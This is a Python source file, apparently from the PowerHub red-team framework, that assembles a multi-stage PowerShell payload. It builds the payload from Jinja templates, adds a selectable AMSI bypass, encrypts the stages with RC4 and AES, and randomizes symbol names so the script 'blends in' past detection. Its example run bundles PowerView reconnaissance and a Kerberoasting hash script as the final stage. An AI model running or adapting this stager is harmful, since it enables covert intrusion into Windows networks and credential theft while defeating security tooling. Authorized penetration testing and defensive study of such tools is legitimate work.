import base64
import os
import re
import string
import random

from powerhub.dhkex import DH_N, DH_G, DH_ENDPOINT

symbol_list = {None: None}


def symbol_name(name):
    global symbol_list
    if name not in symbol_list:
        symbol_list[name] = choose_obfuscated_name()
    return symbol_list[name]


def choose_obfuscated_name():
    # TODO choose better names
    # the names should not contain too much entropy, or it will be
    # detectable. they should also not be too common or we will risk
    # collisions. they should just blend in perfectly.
    result = None
    length = random.choice(range(4, 8))
    while not result and result in list(symbol_list.values()):
        result = ''.join([random.choice(string.ascii_lowercase)
                          for i in range(length)])
        result = random.choice(string.ascii_uppercase) + result
    return result


# TODO add jinja include_randomize_whitespace
# TODO add jinja powershell decoys

def get_stage(key, callback='', amsi_bypass='reflection', stage3_files=[], stage3_strings=[]):
    from jinja2 import Environment, FileSystemLoader

    from powerhub.tools import encrypt_rc4, encrypt_aes
    from powerhub.directories import BASE_DIR

    if amsi_bypass:
        assert '/' not in amsi_bypass
        amsi_bypass = os.path.join('powershell', 'amsi', amsi_bypass + '.ps1')

    context = {
        'key': key,
        'amsibypass': amsi_bypass,
        'symbol_name': symbol_name,
        'full': True,
        "DH_G": DH_G,
        "DH_N": DH_N,
        "endpoint": DH_ENDPOINT,
        "callback_url": callback,
    }

    env = Environment(loader=FileSystemLoader(
        os.path.join(BASE_DIR, 'templates')
    ))

    def rc4encrypt(msg):
        return base64.b64encode(encrypt_rc4(msg.encode(), key)).decode()

    env.filters['rc4encrypt'] = rc4encrypt

    stage1_template = env.get_template(os.path.join('powershell', 'stage1.ps1'))

    stage2_template = env.get_template(os.path.join('powershell', 'stage2.ps1'))
    stage2 = stage2_template.render(**context)
    stage2 = encrypt_rc4(stage2.encode(), key)
    stage2 = base64.b64encode(stage2).decode()

    stage3 = []
    for t in stage3_files + stage3_strings:
        if t in stage3_files:
            buffer = open(t, 'r').read()
        else:
            buffer = t
        buffer = encrypt_aes(buffer.encode(), key)
        buffer = base64.b64encode(buffer).decode()
        stage3.append(buffer)

    context['stage2'] = stage2
    context['stage3'] = stage3

    result = stage1_template.render(**context)

    result = remove_leading_whitespace(result)
    result = remove_blank_lines(result)

    return result


def remove_leading_whitespace(text):
    text = re.sub(r'\s+', ' ', text)
    return text


def remove_blank_lines(text):
    result = [
        line for line in text.splitlines() if line
    ]
    result = '\n'.join(result)
    return result


if __name__ == "__main__":
    print(get_stage('e97f6QqB6LIsjjbdum', stage3_files=[
        '/home/avollmer/git/PowerSploit/Recon/PowerView.ps1',
        '/home/avollmer/git/Get-KerberoastHash.ps1',
    ]))
